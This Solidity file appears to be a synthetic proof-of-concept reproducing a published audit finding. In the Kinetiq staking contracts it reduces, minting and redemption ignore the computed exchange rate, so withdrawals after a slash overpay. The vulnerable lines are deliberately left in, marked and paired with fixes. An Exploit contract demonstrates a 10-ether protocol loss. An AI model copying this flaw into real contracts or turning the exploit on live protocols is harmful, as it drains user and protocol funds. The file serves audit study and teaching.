// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Kinetiq — [H-07] Exchange rate implementation not used in token operations
    (Pashov Audit Group, Kinetiq-security-review_2025-02-26, #58615)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.
    Root cause: getExchangeRatio() / kHYPEToHYPE() exist, but stake() and
    queueWithdrawal() mint/burn 1:1 (kHYPE.mint(msg.sender, msg.value)).
    After slashing moves the true rate below 1, a full withdrawal still pays
    1 HYPE per kHYPE — protocol overpays and loses value.
//////////////////////////////////////////////////////////////////////////*/

contract KHYPE {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function burn(address from, uint256 amt) external {
        require(balanceOf[from] >= amt, "bal");
        balanceOf[from] -= amt;
        totalSupply -= amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        require(balanceOf[from] >= amt, "bal");
        uint256 a = allowance[from][msg.sender];
        require(a >= amt, "allow");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract ValidatorManager {
    uint256 public totalRewards;
    uint256 public totalSlashing;

    function reportSlash(uint256 amount) external {
        totalSlashing += amount;
    }

    function reportReward(uint256 amount) external {
        totalRewards += amount;
    }
}

/// @notice StakingManager with exchange-rate views that ops ignore (1:1 mint/burn).
contract StakingManager {
    KHYPE public immutable kHYPE;
    ValidatorManager public immutable validatorManager;

    uint256 public totalStaked;
    uint256 public totalClaimed;

    constructor(KHYPE _k, ValidatorManager _vm) {
        kHYPE = _k;
        validatorManager = _vm;
    }

    function getExchangeRatio() public view returns (uint256) {
        uint256 totalSlashing = validatorManager.totalSlashing();
        uint256 totalRewards = validatorManager.totalRewards();
        uint256 kHYPESupply = kHYPE.totalSupply();
        require(kHYPESupply > 0, "No kHYPE supply");
        uint256 totalHYPE = totalStaked + totalRewards - totalClaimed - totalSlashing;
        return (totalHYPE * 1e18) / kHYPESupply;
    }

    function kHYPEToHYPE(uint256 kAmount) public view returns (uint256) {
        return (kAmount * getExchangeRatio()) / 1e18;
    }

    function HYPEToKHYPE(uint256 hAmount) public view returns (uint256) {
        uint256 ratio = getExchangeRatio();
        return (hAmount * 1e18) / ratio;
    }

    function stake() external payable {
        require(msg.value > 0, "zero");
        totalStaked += msg.value;
        // Source: stake mints 1:1, ignoring HYPEToKHYPE / getExchangeRatio.
        kHYPE.mint(msg.sender, msg.value); // @> VULN: mint 1:1 — exchange rate not applied (should be HYPEToKHYPE(msg.value))
        // FIX: kHYPE.mint(msg.sender, HYPEToKHYPE(msg.value));
    }

    /// @dev Instant withdraw for the PoC (models queue+confirm paying 1:1).
    function withdraw(uint256 kAmount) external {
        require(kHYPE.balanceOf(msg.sender) >= kAmount, "bal");
        // Buggy: pays 1:1 HYPE per kHYPE instead of kHYPEToHYPE(kAmount).
        uint256 hypeOut = kAmount; // @> VULN-PAIR: 1:1 redeem ignores kHYPEToHYPE / getExchangeRatio
        // FIX: uint256 hypeOut = kHYPEToHYPE(kAmount);
        kHYPE.burn(msg.sender, kAmount);
        totalClaimed += hypeOut;
        (bool ok,) = msg.sender.call{value: hypeOut}("");
        require(ok, "pay");
    }

    /// @dev Seed extra HYPE so overpayment is payable (models buffer / rewards inventory).
    function seedLiquidity() external payable {}

    receive() external payable {}
}

contract User {
    StakingManager public mgr;
    KHYPE public kHYPE;

    constructor(StakingManager _m, KHYPE _k) {
        mgr = _m;
        kHYPE = _k;
    }

    function doStake() external payable {
        mgr.stake{value: msg.value}();
    }

    function doWithdraw(uint256 kAmount) external {
        mgr.withdraw(kAmount);
    }

    receive() external payable {}
}

/// CREATE order: kHYPE (1), vm (2), manager (3), user (4).
contract Exploit {
    KHYPE public kHYPE;
    ValidatorManager public vm;
    StakingManager public manager;
    User public user;

    uint256 public ratioAfterSlash;
    uint256 public fairHype;
    uint256 public paidHype;
    uint256 public protocolLoss;

    constructor() {
        kHYPE = new KHYPE(); // 1
        vm = new ValidatorManager(); // 2
        manager = new StakingManager(kHYPE, vm); // 3
        user = new User(manager, kHYPE); // 4
    }

    function run() external payable {
        // 100 HYPE stake + 20 HYPE extra liquidity so overpay is payable.
        require(msg.value >= 120 ether, "need 120");

        user.doStake{value: 100 ether}();
        require(kHYPE.balanceOf(address(user)) == 100 ether, "1:1 mint");

        // Seed liquidity so the 1:1 overpay after slash can actually send ETH.
        manager.seedLiquidity{value: 20 ether}();

        // Slash 10 HYPE → true ratio should be 0.9 (90/100).
        vm.reportSlash(10 ether);
        ratioAfterSlash = manager.getExchangeRatio();
        require(ratioAfterSlash == 0.9e18, "ratio 0.9");
        fairHype = manager.kHYPEToHYPE(100 ether);
        require(fairHype == 90 ether, "fair 90");

        uint256 userBefore = address(user).balance;
        user.doWithdraw(100 ether);
        paidHype = address(user).balance - userBefore;

        // Buggy 1:1 pays 100 instead of fair 90 → 10 HYPE protocol loss.
        require(paidHype == 100 ether, "paid 1:1");
        protocolLoss = paidHype - fairHype;
        require(protocolLoss == 10 ether, "harm not demonstrated");
    }

    receive() external payable {}
}
